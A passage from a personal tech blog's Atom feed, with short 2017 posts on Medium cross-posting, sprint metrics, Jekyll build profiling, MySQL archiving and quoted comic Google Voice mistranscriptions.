Exit</th></tr></thead><tbody><tr><td>/2013/08/26/extract-info-from-a-web-page-using-javascript/</td><td>6964</td><td>6576</td><td>379.93</td><td>6564</td><td>94.65%</td><td>94.10%</td></tr><tr><td>/2017/04/11/sql-is-the-perfect-interface/</td><td>2559</td><td>2481</td><td>169.74</td><td>2474</td><td>97.01%</td><td>96.64%</td></tr><tr><td>/2015/09/24/mapping-the-jersey-city-parking-zones-ii/</td><td>1602</td><td>1411</td><td>154.03</td><td>1377</td><td>88.96%</td><td>87.64%</td></tr><tr><td>/2015/05/26/dealing-with-a-stripped-screw/</td><td>1335</td><td>1287</td><td>272.61</td><td>1285</td><td>96.42%</td><td>96.33%</td></tr><tr><td>/2014/02/10/using-virtualenv-in-production/</td><td>968</td><td>935</td><td>442.22</td><td>932</td><td>96.46%</td><td>96.28%</td></tr><tr><td>/2015/04/23/adding-columns-in-postgresql-and-redshift/</td><td>964</td><td>930</td><td>255.42</td><td>929</td><td>96.56%</td><td>96.27%</td></tr><tr><td>/2013/01/09/web-scraping-like-a-pro/</td><td>886</td><td>854</td><td>154.84</td><td>854</td><td>95.67%</td><td>95.82%</td></tr><tr><td>/2014/07/15/set-up-https-on-ec2-running-nginx-without-elb/</td><td>849</td><td>819</td><td>412.23</td><td>819</td><td>96.83%</td><td>96.47%</td></tr><tr><td>/2013/06/21/where-are-you-on-the-sales-matrix/</td><td>797</td><td>734</td><td>251.21</td><td>732</td><td>92.08%</td><td>91.72%</td></tr><tr><td>/2014/02/05/visualizing-gps-data-in-r/</td><td>689</td><td>610</td><td>211.50</td><td>609</td><td>88.18%</td><td>88.10%</td></tr><tr><td>/2013/12/23/getting-a-sim-card-in-india/</td><td>448</td><td>400</td><td>586.48</td><td>400</td><td>94.25%</td><td>88.84%</td></tr><tr><td>/2017/03/26/fulfillment-by-amazon-counterfeiting/</td><td>328</td><td>319</td><td>84.93</td><td>315</td><td>97.14%</td><td>95.73%</td></tr><tr><td>/2015/05/26/dealing-with-a-stripped-screw/?usqp=mq331AQCCAE=</td><td>320</td><td>312</td><td>522.44</td><td>312</td><td>97.12%</td><td>97.19%</td></tr><tr><td>/2014/10/01/normalizing-a-csv-file-using-mysql/</td><td>318</td><td>306</td><td>480.83</td><td>302</td><td>96.36%</td><td>96.23%</td></tr><tr><td>/2015/04/06/redshift-meets-excel/</td><td>311</td><td>307</td><td>33.50</td><td>305</td><td>98.36%</td><td>97.43%</td></tr><tr><td>/2017/04/02/slacks-channel-exit-anti-pattern/</td><td>296</td><td>291</td><td>46.00</td><td>288</td><td>96.18%</td><td>95.61%</td></tr><tr><td>/2015/04/26/aws-service-limits/</td><td>271</td><td>265</td><td>546.78</td><td>263</td><td>97.34%</td><td>96.68%</td></tr><tr><td>/2015/09/24/mapping-the-jersey-city-parking-zones-ii/?usqp=mq331AQCCAE=</td><td>270</td><td>216</td><td>106.56</td><td>216</td><td>69.91%</td><td>69.63%</td></tr><tr><td>/2014/09/20/dealing-with-an-rds-replication-issue/</td><td>244</td><td>234</td><td>452.00</td><td>234</td><td>96.15%</td><td>95.90%</td></tr><tr><td>/2016/01/10/cleanest-way-to-read-a-csv-file-with-python/</td><td>238</td><td>229</td><td>384.55</td><td>228</td><td>96.49%</td><td>95.38%</td></tr></tbody></table>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My Medium experiment</title>
   <link href="http://dangoldin.com/2017/12/22/my-medium-experiment/"/>
   <updated>2017-12-22T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/12/22/my-medium-experiment</id>
   <content:encoded><![CDATA[
<p>Last May I <a href="/2016/05/15/experimenting-with-medium/">decided</a> to start cross posting to Medium to see what impact that would have on pageviews. My approach was to publish first on this blog and then post the same piece a few days later to Medium to get some additional views. Once concern was that the duplicate content would hurt SEO but luckily Medium allowed me to specify the <a href="https://support.google.com/webmasters/answer/139066?hl=en">canonical URL</a> which I pointed back to the original post.</p>

<p>So how did this work? According to the Medium stats, I published 89 stories that drove 650 direct views, 587 “additional” views, and 502 total reads. The majority of these came from two posts - <a href="https://medium.com/@dangoldin/lessons-learned-from-todays-s3-failure-e308012ebf89">one</a> that had 310 direct views and <a href="https://medium.com/@dangoldin/optical-illusions-and-self-driving-cars-49e906f5f328">another</a> that had no direct views but 450 additional views. This blog, on the other hand, had just over 59,000 pageviews over the same time period. It’s a bit unfair to compare them against one another since the blog does have a lot of existing content driving some of the views but the difference is substantial. I’m still going to continue cross posting to Medium since it looks as if there’s no SEO hit, it is driving some additional views, and the additional work is nominal due to a simple script I wrote that generates Medium drafts from my markdown posts. At the same time I am a bit disappointed since I did expect Medium to do more of its magic - although given how popular it is it’s not surprising that my posts are not the ones being surfaced.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Analyzing my blog: 2017 edition</title>
   <link href="http://dangoldin.com/2017/12/21/analyzing-my-blog-2017-edition/"/>
   <updated>2017-12-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/12/21/analyzing-my-blog-2017-edition</id>
   <content:encoded><![CDATA[
<p>I have a set of <a href="https://github.com/dangoldin/blog-analytics">scripts</a> I wrote in 2016 that aimed to <a href="/2016/06/12/analyzing-my-blog/">analyze my posts</a> over the years and hopefully offered up some insights. I’ve updated them for 2017 but rather than posting every single visualization I thought it would be more valuable to highlight the ones that seemed the most relevant and interesting.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/date_year-plot-count-2017.png" alt="Posts over time" width="2100" height="2100" layout="responsive"/>
      <p>The year is not quite over but I'm defintiely behind on my posts that I hope to power through by the end of the year.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/date_month-plot-words-2017.png" alt="Words over time" width="2100" height="2100" layout="responsive"/>
      <p>Similarly, the total word volume is lower and in addition to fewer posts it seems when I do write my posts are shorter.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/dow-date_year-plot-2017.png" alt="Posts by day of week and year" width="2100" height="2100" layout="responsive"/>
      <p>I wanted to avoid only writing on the weekend and this year has been an improvement. I strive to write during the week to keep it more balanced but it hasn't been as easy to find the time and I end up having to catch up over the weekend.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/company-mention-2017.png" alt="Company mentions over time" width="2100" height="2100" layout="responsive"/>
      <p>A somewhat interesting chart many of my posts are about tech companies and this shows the trend of companies I write about over time. Surprisingly not much has changed over the past few years and it seems I've settled on a pattern.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud_2017.png" alt="2017 word cloud" width="600" height="600" layout="responsive"/>
      <p>I like the concept of word clouds since with a quick glance you're able to get a sense of the topic. In this case it's definitely leaning more on the tech side as well as high level software development concepts.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>More intelligent credit card merchant rates</title>
   <link href="http://dangoldin.com/2017/12/14/more-intelligent-credit-card-merchant-rates/"/>
   <updated>2017-12-14T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/12/14/more-intelligent-credit-card-merchant-rates</id>
   <content:encoded><![CDATA[
<p>While reading today’s <a href="https://stratechery.com/2017/patreon-reverses-itself-the-patreon-backstory-and-the-reality-of-fees-patreons-mistake/">Stratechery update</a> on Patreon changing their pricing model I came across the following passage:</p>

<blockquote>
  <p>Of course this wasn’t great for creators: payments made for a creation released on November 2 wouldn’t land in creators’ bank accounts until some time after December 1; the reasoning, though, was clear — credit card fees. Here I can certainly bring personal experience to bear: credit card fees are really expensive (they are by far Stratechery’s largest expense)! While the exact amount varies by network (that is, American Express is the most expensive), most credit card fees are ~$0.30/charge plus anywhere from 1.5% to 3.5% of the total amount charged.</p>
</blockquote>

<blockquote>
  <p>That $0.30 is more important than it might seem; to use Stratechery as an example, I charge $10/month or $100/year — that suggests that I earn $20 less from annual subscribers than I do from monthly ones. However, because I have to incur that fee 12 times a year for monthly subscribers, but only once for annual subscribers, the difference is actually only about $16 (by the way, monthly subscribers can easily upgrade to annual accounts; I push a seemingly lower revenue option because it turns out annual subscribers have significantly higher lifetime value — a higher up-front commitment ends up being a longer commitment). The importance of that fee looms even larger for Patreon’s “charge-per-creation” creators, who often charged only a dollar or two for their creations: were Patreon to charge credit cards immediately, over 30% of payments would go towards fees; however, by bundling payments over the entire month fees are much more manageable.</p>
</blockquote>

<p>Clearly credit card issuers and banks need to make some money on their credit cards but these rates seem a bit aggressive, I don’t know the details but I’m sure a chunk of that is to cover cases of fraud. That makes sense but it seems there’s an opportunity to charge lower and lower rates for each recurring subscription charge. The intuition is that the likelihood of a person not being able to cover the subscription charge is much higher the first time they get billed rather than each subsequent one since they’ve built a strong payment history. Beyond this, it does feel as if there’s something a bit more intelligent that can be done around these merchant rates. They were instituted decades ago before the growth of modern data analysis methods that can be run for each individual and had to be set for the whole population. Imagine how optimized these rates can be now given modern tools. This is a huge opportunity and I’m surprised there haven’t been any companies trying to tackle it - maybe it’s due to the complexity of the space or network effects but it just feels as if there’s something here.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Google's news problem</title>
   <link href="http://dangoldin.com/2017/12/10/googles-news-problem/"/>
   <updated>2017-12-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/12/10/googles-news-problem</id>
   <content:encoded><![CDATA[
<p>Last week, I wanted to get a bit more information about the vote in Alabama and have always had good success by starting with a Google search so did a simple search for “alabama vote.” I saw three suggested results but surprisingly the first one was a link to Breitbart.</p>

<img src="http://dangoldin.com/assets/static/images/google-news-alabama-vote-2017-12-05.png" width="1588" height="1064" layout="responsive"/>
<p class="caption">Search for alabama vote on 2017-12-05</p>

<p>I ran the same search a few days ago and saw that the first link was to yet another Breitbart article.</p>

<img src="http://dangoldin.com/assets/static/images/google-news-alabama-vote-2017-12-09.png" width="1582" height="1058" layout="responsive"/>
<p class="caption">Search for alabama vote on 2017-12-09</p>

<p>Finally when I repeated the search the past two days Breitbart was out and I saw legitimate news publishers.</p>

<img src="http://dangoldin.com/assets/static/images/google-news-alabama-vote-2017-12-11.png" width="1570" height="1078" layout="responsive"/>
<p class="caption">Search for alabama vote on 2017-12-10</p>

<img src="http://dangoldin.com/assets/static/images/google-news-alabama-vote-2017-12-10.png" width="1580" height="1054" layout="responsive"/>
<p class="caption">Search for alabama vote on 2017-12-11</p>

<p>Now I realize that it’s tough to do recommendations right but it’s still shocking that Google wouldn’t even prioritize the most recent news results ahead of something clearly misleading. The sad truth is that the linkbaity articles are more engaging than real news but it’s disappointing that Google is prioritizing user engagement and clicks over quality. I’ve been trying to make myself less and less reliant on Google and examples like this give me more and more reason to do so.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Jira analysis script</title>
   <link href="http://dangoldin.com/2017/12/07/jira-analysis-script/"/>
   <updated>2017-12-07T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/12/07/jira-analysis-script</id>
   <content:encoded><![CDATA[
<p>A few days ago I <a href="/2017/12/01/measuring-sprint-efficiency/">wrote</a> about using average number of sprints to complete a story as a way to measure a team’s sprint efficiency. Unfortunately at that time I had a pretty hacky <a href="https://github.com/dangoldin/automating-management/blob/master/jira-analysis.py">Jira analysis script</a> that I was too ashamed to share but it has been cleaned up enough for me to not feel too much guilt. It’s available on GitHub and comes with a few additional bells and whistles. One is specific to the way we work where we label relevant stories with a priority (priority:1, priority:2, etc) based on our planning process so we can hold ourselves accountable to spending the appropriate time on our initiatives. The other is a simple way that calculates the story points done by assignee. It’s a dangerous metric to use since story points are variable and not all work is measured via story points but it’s yet another metric that can help highlight or sharpen a potential issue.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Measuring sprint efficiency</title>
   <link href="http://dangoldin.com/2017/12/01/measuring-sprint-efficiency/"/>
   <updated>2017-12-01T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/12/01/measuring-sprint-efficiency</id>
   <content:encoded><![CDATA[
<p>Most startups employ some form of <a href="https://en.wikipedia.org/wiki/Agile_software_development">Agile software development</a> and one of the most common approaches is <a href="https://en.wikipedia.org/wiki/Scrum_(software_development)">Scrum</a> which breaks down units of work into time based periods. I don’t want to spend too much time describing either Agile or Scrum since I suspect most are familiar with the concepts but a big challenge is measuring productivity. There are tons of different ways of doing this but the vast majority are different ways of looking at the relationship between story points and sprints. Most of these are focused on some form of velocity - measuring the amount of story points per sprint but an interesting metric I’ve started tracking is average number of sprints per story point. On the surface this is similar to taking the inverse but it turns out it tells different story.</p>

<p>By taking a look at the average number of sprints it takes to do a story you can both get a sense of the team’s velocity but also highlight that some stories keep getting deprioritized. As an example imagine a team doing every story within the sprint it’s assigned - the team’s average sprints per story value is 1. If any stories end up rolling over into the next sprint then this value keeps growing past 1. A value of 2 would indicate that it takes two sprints to complete an average story - something that indicates that the team’s not able to do what they’re setting out to do each sprint.</p>

<p>This metric can also be weighted by our favorite value - story points. The idea here is to give more weight to larger stories and see what the resulting sprints per story value looks like. If it’s above the unweighted one it indicates that more complex stories are taking longer to do and there may be an issue in the point estimation. If it’s lower than the unweighted average it may indicate that the story points are inflated.</p>

<p>No single metric will tell you everything you need to do know and it’s dangerous to rely solely on numbers. At the same time, each new metric is a data point and can help paint a picture of what’s going on. Combined with a more qualitative approach they provide a better understanding than either one alone.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Google Voice transcription fails</title>
   <link href="http://dangoldin.com/2017/11/30/google-voice-transcription-fails/"/>
   <updated>2017-11-30T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/11/30/google-voice-transcription-fails</id>
   <content:encoded><![CDATA[
<p>A fun post today. I went through Google Voice’s attempts at transcribing my grandmother’s Russian voicemails into English. As expected they don’t make any sense but they do provide some comedic relief. and as expected they make no sense but there’s some gold . Google has one of, if not the, best data science teams around and it shouldn’t be too difficult to train Google Voice to detect the language before providing the transcripts. I <a href="http://dangoldin.com/2016/01/17/poor-neglected-google-voice/">wrote</a> about this last January and it’s somewhat shocking that they did a redesign of Google Voice and yet didn’t address the actual functionality. But hey, at least we get to laugh.</p>

<blockquote>
  <p>Monica Travis to be in Justin King bed and said Doorman YouTube free movies to be I hope sister row. It’s big social hello. Mortgage guy, this is Janice knock knock who’s there?</p>
</blockquote>

<blockquote>
  <p>Garden Workshop is Stevia. Mr. Gage, just way more. the most good woman in comma Kim Hurst media that woman workshops</p>
</blockquote>

<blockquote>
  <p>hello period Daniel Costa Papa Toyota Ohh meet up with you the phone open a test in Corpus loan of Markham. Phineas and wish you a receipt for that. Gollum Commit What the door it’s okay?</p>
</blockquote>

<blockquote>
  <p>Glen Burnie, I was wondering if I go screw the smoker.</p>
</blockquote>

<blockquote>
  <p>Betty who travis to be there to pick up s*** up? It’s official love it’s working and not feeling India. It’s reema so logical Cochran Thomas. It’s about at you as soon as it would take a little as I’m in an orchard in Glasgow, Kentucky Carquest in the very bored on the way, then you come over to f*** management. Workshop as smoothly Mr. Otero. Did they see me at the time of the month is when it’s in your mouth when you can the number style?</p>
</blockquote>

<blockquote>
  <p>I’m doing that and onion crisps simple the showroom races you a quote your motor bike. It does wine is the demo step yeah your mother week anyway to me with this. What is it took me? So long some more when you want us to go in and wasn’t able to reach anyone with anyone this line is Cecilia was not with your Papa was returning a step of the way, it’s vince carter. So this will choose mostly was going give me a personal today.</p>
</blockquote>

<blockquote>
  <p>Nautica think I get to Milford area that you didn’t rush for booking with Shelby. It’s been delivered so now we’re that we’re headed to bed afterwards. We won’t you would thank you? Good. I miss you, so she was I was on my trucker that one listen scott with them, but they’re one in the same workshop. That was okay.</p>
</blockquote>

<blockquote>
  <p>Burning cos overview to give me a ring if you’re not thomas to your order it is noon or so, so sorry. I bring an umbrella. What you’re too busy doing your mom I was just sooner line. No, other way. I moved ohh cook with your background. Which is 100 good.</p>
</blockquote>

<blockquote>
  <p>Meagan good onion, Google Chavez today is there will be a resource constrain your head ocean subaru take a cab which is 322 and the year to be a driver of the system. It today, it’s way over now. water stick with my special</p>
</blockquote>

<blockquote>
  <p>Yoga Workshop disturb you will be supported or bring you dinner with her phone is dying. It’s a big is Rose. Rose my juice. 30th september with that if she’s not approach the Smothers press tiny good Shabbos issue that.</p>
</blockquote>

<blockquote>
  <p>Monica just now getting to see when you might with this weight needs. So f<strong>**</strong> in Delaware, so f<strong>**</strong> strain your God with you for spring you.</p>
</blockquote>

<blockquote>
  <p>Tinker what’s up? It’s Rebecca roaches to work. Cuz my music this morning.</p>
</blockquote>

<blockquote>
  <p>burning Cargo chops Timber your new merchant, or do not wish him too. So that was in the store, and you have a short deborah. I’m with West moses press 1 now.</p>
</blockquote>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Make all laws temporary</title>
   <link href="http://dangoldin.com/2017/11/25/make-all-laws-temporary/"/>
   <updated>2017-11-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/11/25/make-all-laws-temporary</id>
   <content:encoded><![CDATA[
<p>I see the debate around net neutrality going on everywhere around me and I can’t help but think of the law making process and how it can be improved. I’m a huge proponent of net neutrality but at the same time I realize that maybe I don’t know the whole story and maybe we would all really be better if the FCC rolls it back. I don’t believe it’s likely but I’m not 100% convinced that it’s not the case either. Unlike a video game, you can’t save life at any point and restart it if something goes wrong or you want to try a different approach: we’re stuck with the decisions we’ve made. At the same time it would be nice to bring some more experimentation into the world and our laws so we can keep iterating to a more ideal state.</p>

<p>One idea that I’ve been toying with lately is to make every law temporarily and be rolled back automatically within a set of number of years. The only way to extend it would be with another vote. And in order to make sure they’re still valuable the vote would require a higher margin than the previous vote. This way only the truly valuable laws that have widespread belief end up standing the test of time and weaker laws end up naturally dropping off. The exact way and times it would work can be worked out but the key idea is to assume every law passed will be temporary and keep increasing the bar that keeps it active.</p>

<p>This would change the entire way we approach laws and make it much more experimental. If you know something is temporary you’re more likely to treat it as an experiment which would make it easier to pass laws but more difficult to sustain them. Of course we would still need to consider the risks and consequences of every law passed but it’s impossible to plan for everything and trying something that can be rolled back is a much better situation than committing to something that will stick around forever.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Improving Jekyll generation speed for AMP pages</title>
   <link href="http://dangoldin.com/2017/11/23/improving-jekyll-generation-speed-for-amp-pages/"/>
   <updated>2017-11-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/11/23/improving-jekyll-generation-speed-for-amp-pages</id>
   <content:encoded><![CDATA[
<p>Last September I migrated my blog over to AMP which entailed a variety of challenges ranging from converting every img tag to an amp-img tag with some additional metadata to figuring out how to support Disqus. I tackled the critical ones but the one I never got to was speeding up the build time since it had no impact on the actual reader experience and just slowed down my build and commit process. During this Thanksgiving break I finally decided to do something about it after discovering that jekyll has a profiling feature. It’s expected that the bulk of the time is spent generating the post pages but running the profiler highlighted that the majority of the work wasn’t in the actual content block but in generating the head element - something that shold similar from page to page.</p>

<table>
  <thead>
    <tr>
      <th>Filename</th>
      <th>Count</th>
      <th>Bytes</th>
      <th>Time</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>_layouts/default.html</td>
      <td>570</td>
      <td>16663.07K</td>
      <td>230.544</td>
    </tr>
    <tr>
      <td>_includes/themes/amp/default.html</td>
      <td>570</td>
      <td>16658.06K</td>
      <td>229.425</td>
    </tr>
    <tr>
      <td>_includes/head.html</td>
      <td>570</td>
      <td>11934.62K</td>
      <td>228.908</td>
    </tr>
    <tr>
      <td>_layouts/post.html</td>
      <td>562</td>
      <td>3595.71K</td>
      <td>5.542</td>
    </tr>
    <tr>
      <td>_includes/themes/amp/post.html</td>
      <td>562</td>
      <td>3590.77K</td>
      <td>4.640</td>
    </tr>
    <tr>
      <td>_includes/metadata.json</td>
      <td>570</td>
      <td>461.90K</td>
      <td>3.392</td>
    </tr>
    <tr>
      <td>_includes/setup</td>
      <td>2181</td>
      <td>14.91K</td>
      <td>2.345</td>
    </tr>
    <tr>
      <td>_includes/tags_list</td>
      <td>559</td>
      <td>73.99K</td>
      <td>0.874</td>
    </tr>
    <tr>
      <td>_includes/footer.html</td>
      <td>570</td>
      <td>1167.83K</td>
      <td>0.256</td>
    </tr>
    <tr>
      <td>sitemap.xml</td>
      <td>1</td>
      <td>62.20K</td>
      <td>0.245</td>
    </tr>
    <tr>
      <td>_includes/styles.scss</td>
      <td>570</td>
      <td>5736.18K</td>
      <td>0.115</td>
    </tr>
    <tr>
      <td>archive.html</td>
      <td>1</td>
      <td>120.81K</td>
      <td>0.114</td>
    </tr>
    <tr>
      <td>_includes/posts_collate</td>
      <td>1</td>
      <td>120.80K</td>
      <td>0.105</td>
    </tr>
    <tr>
      <td>atom.xml</td>
      <td>1</td>
      <td>1739.08K</td>
      <td>0.063</td>
    </tr>
    <tr>
      <td>tags.html</td>
      <td>1</td>
      <td>108.78K</td>
      <td>0.056</td>
    </tr>
    <tr>
      <td>_includes/header.html</td>
      <td>570</td>
      <td>709.16K</td>
      <td>0.056</td>
    </tr>
    <tr>
      <td>_includes/pages_list</td>
      <td>2</td>
      <td>103.64K</td>
      <td>0.047</td>
    </tr>
    <tr>
      <td>index.md</td>
      <td>1</td>
      <td>106.79K</td>
      <td>0.020</td>
    </tr>
    <tr>
      <td>_layouts/page.html</td>
      <td>6</td>
      <td>246.62K</td>
      <td>0.010</td>
    </tr>
    <tr>
      <td>sitemap.txt</td>
      <td>1</td>
      <td>34.99K</td>
      <td>0.010</td>
    </tr>
    <tr>
      <td>done in 245.117 seconds.</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>After taking a quick look at the head.html file it became clear what the problem was: AMP requires the CSS to be inline which combined with my usage of SCSS which needed to be transpiled to CSS on every page. Unsurprisingly, this was an expensive operation and the solution was to somehow get rid of it. While we can’t avoid inlining the CSS what we can do is transpile the SCSS to CSS once and include the contents in every post. Even better is to read the contents of the resulting CSS file once and then just inject it whenever necessary via the <a href="https://github.com/benbalter/jekyll-include-cache">jekyll-include-cache</a> extension. Applying these tactics gets the blog generation time down to 15 seconds from over 4 minutes. It does require the CSS file to be regenerated every time the SCSS file changes but given the infrequency it’s not a huge issue. This doesn’t make it any quicker to write posts but it does feel good to get such a big improvement in blog generation speed.</p>

<table>
  <thead>
    <tr>
      <th>Filename</th>
      <th>Count</th>
      <th>Bytes</th>
      <th>Time</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>_layouts/default.html</td>
      <td>570</td>
      <td>16663.10K</td>
      <td>4.277</td>
    </tr>
    <tr>
      <td>_layouts/post.html</td>
      <td>562</td>
      <td>3595.71K</td>
      <td>4.104</td>
    </tr>
    <tr>
      <td>_includes/themes/amp/default.html</td>
      <td>570</td>
      <td>16658.09K</td>
      <td>3.984</td>
    </tr>
    <tr>
      <td>_includes/head.html</td>
      <td>570</td>
      <td>11934.64K</td>
      <td>3.607</td>
    </tr>
    <tr>
      <td>_includes/themes/amp/post.html</td>
      <td>562</td>
      <td>3590.78K</td>
      <td>3.306</td>
    </tr>
    <tr>
      <td>_includes/metadata.json</td>
      <td>570</td>
      <td>461.92K</td>
      <td>2.420</td>
    </tr>
    <tr>
      <td>_includes/setup</td>
      <td>1612</td>
      <td>11.02K</td>
      <td>1.367</td>
    </tr>
    <tr>
      <td>_includes/tags_list</td>
      <td>559</td>
      <td>73.99K</td>
      <td>0.700</td>
    </tr>
    <tr>
      <td>sitemap.xml</td>
      <td>1</td>
      <td>62.20K</td>
      <td>0.251</td>
    </tr>
    <tr>
      <td>archive.html</td>
      <td>1</td>
      <td>120.81K</td>
      <td>0.119</td>
    </tr>
    <tr>
      <td>_includes/posts_collate</td>
      <td>1</td>
      <td>120.80K</td>
      <td>0.111</td>
    </tr>
    <tr>
      <td>atom.xml</td>
      <td>1</td>
      <td>1739.13K</td>
      <td>0.065</td>
    </tr>
    <tr>
      <td>tags.html</td>
      <td>1</td>
      <td>108.78K</td>
      <td>0.064</td>
    </tr>
    <tr>
      <td>_includes/pages_list</td>
      <td>2</td>
      <td>103.64K</td>
      <td>0.050</td>
    </tr>
    <tr>
      <td>_includes/header.html</td>
      <td>570</td>
      <td>709.16K</td>
      <td>0.041</td>
    </tr>
    <tr>
      <td>index.md</td>
      <td>1</td>
      <td>106.79K</td>
      <td>0.019</td>
    </tr>
    <tr>
      <td>sitemap.txt</td>
      <td>1</td>
      <td>34.99K</td>
      <td>0.011</td>
    </tr>
    <tr>
      <td>_layouts/page.html</td>
      <td>6</td>
      <td>246.62K</td>
      <td>0.008</td>
    </tr>
    <tr>
      <td>done in 15.077 seconds.</td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Ride sharing ride bailing</title>
   <link href="http://dangoldin.com/2017/11/20/ride-sharing-ride-bailing/"/>
   <updated>2017-11-20T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/11/20/ride-sharing-ride-bailing</id>
   <content:encoded><![CDATA[
<p>One of the more frustrating modern, first-world problems is booking a Lyft or an Uber ride and having the driver cancel the ride a soon as they find out where you’re going. While against policy it is a rational decision by the driver. Why agree to a trip somewhere where it’ll be difficult to pick up another passenger and then have to return to where you started and incur a toll? Of course you run the risk of a complaint but I suspect most people will silently accept the misjustice so the expected value of canceling the ride is in your favor.</p>

<p>Given how much effort Lyft and Uber are expending on price prediction it seems there’s an obvious solution here: take into account the expectation of future rides based on the destination when calculating the current trip’s payout. They know how likely a driver will be to get another ride at the destination at the expected arrival time and can use that knowledge to price appropriately. This encourages drivers to take these less rewarding trips but does shift the cost to the customer. This strikes me as a fair solution though - imagine if the driver knew everyone’s destination and the individuals had to bid for a ride. The drivers would take the destination and bid into account when determing who to pick up. There are obvious reasons to not make the destination visible to the driver before picking but there are ways ride sharing companies can make these less profitable trips more sustainable. This is one of the decisions that’s all about finding the balance between the driver and the passenger but in this case there’s room to move closer to the driver. In the end it will benefit the passenger as well who will avoid having to deal with a canceled ride, which is usually to a destination that requires punctuality, such as a train station or an airport.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Archiving large MySQL tables</title>
   <link href="http://dangoldin.com/2017/11/18/archiving-large-mysql-tables/"/>
   <updated>2017-11-18T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/11/18/archiving-large-mysql-tables</id>
   <content:encoded><![CDATA[
<p>One of the major changes we made when building the latest iteration of our data pipeline was moving our key agg tables over from MySQL to Redshift. Despite the migration we thought it would be prudent to archive these tables. The challenge was that some of these tables were hundreds of gigabytes so doing a simple mysqldump wouldn’t work. The reason these tables were so large is because they included a date dimension which led to our <a href="https://github.com/dangoldin/python-tools/blob/master/archive_tables.py">archive script</a>. The script works by generating a sequence of shell commands that slice the table into chunks by date, gzip each chunk, and upload it to an S3 bucket. This keeps each individual chunk small enough to archive while making sure all the data is captured. It’s not the most elegant solution but it’s obvious and it’s quick. The one piece that’s missing is the table schema which can be fetched separately.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>DevOps and Core Engineering application gap</title>
   <link href="http://dangoldin.com/2017/11/15/devops-and-core-engineering-application-gap/"/>
   <updated>2017-11-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/11/15/devops-and-core-engineering-application-gap</id>
   <content:encoded><![CDATA[
<p>Lately I’ve been pondering about applications that exist between core engineering and devops. Applications that have existed for years and have widespread adoption have best practices that many devops engineers have mastered - think of Apache or nginx. On the other extreme you have single page apps that exist solely in the browser and don’t need any support from the devops team after they’re deployed. Yet there’s a whole range of applications in the middle that don’t fall neatly into either of the camps. They have a gamut of configuration options that are heavily dependent on the workload which makes it difficult for either side to manage individually. In my limited experience these tend to be common in the big data ecosystem - Spark, Druid, and Kafka are great examples. Go through any of the documentation and you discover how complex the configuration can get and how tough it is to get it right. Without having any prior experience it’s difficult to see how one can get it immediately right. It requires understanding the use case, the expected volume, and a fair amount of experimentation to get right. This is not something that can be determined by devops or core engineering alone and is ideally a group effort.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Modern world of massive competiting corporations</title>
   <link href="http://dangoldin.com/2017/11/11/modern-world-of-massive-competiting-corporations/"/>
   <updated>2017-11-11T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/11/11/modern-world-of-massive-competiting-corporations</id>
   <content:encoded><![CDATA[
<p>I’m both fascinated and extremely unqualified to discuss China. Every time I read an article about technology and business in China I discover it’s a completely different world than the one I’m used to. Just today I read an <a href="https://www.theinformation.com/chinas-jd-com-fights-alibaba-with-robots-drone">article</a> about two competing e-commerce companies - JD and Alibaba - and how they’re tackling ecommerce in China via antithetical approaches. And the market is so big and so nascent that it feels as if every company is trying to be involved in every industry. In the US we have Amazon which seemingly is getting involved in every industry but in China it feels as if every major technology company is doing the same. In this case JD is allying itself with Tencent - a competitor to Alibaba. Maybe it’s the natural order to have massive corporations competing with each other in every industry via partnerships with hundreds of competing startups.</p>

<p>This is very similar with what’s happening in the US now. Amazon’s acquisition of Whole Foods was seen as such a threat by other grocers that they’re all <a href="https://www.forbes.com/sites/bizcarson/2017/11/08/amazon-whole-foods-deal-future-of-instacart-grocery-delivery/#1e451e7e6d5a">rushing to partner</a> with Instacart - a company many thought would be hurt by the acquisition. The same thing is <a href="https://www.theinformation.com/amazons-growth-speeds-demand-for-deliv">happening with Deliv</a>, a same-day delivery startup that’s quickly increasing the number of partnerships it has with brick and mortar retailers. How does this play out? It seems that the largest companies are getting larger and larger and whatever functionality they lack they will either acquire or partner. And if any one of these major corporations achieves some sort of breakthrough there will always be a startup willing to provide that same service to competitors.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Spark's read.jdbc</title>
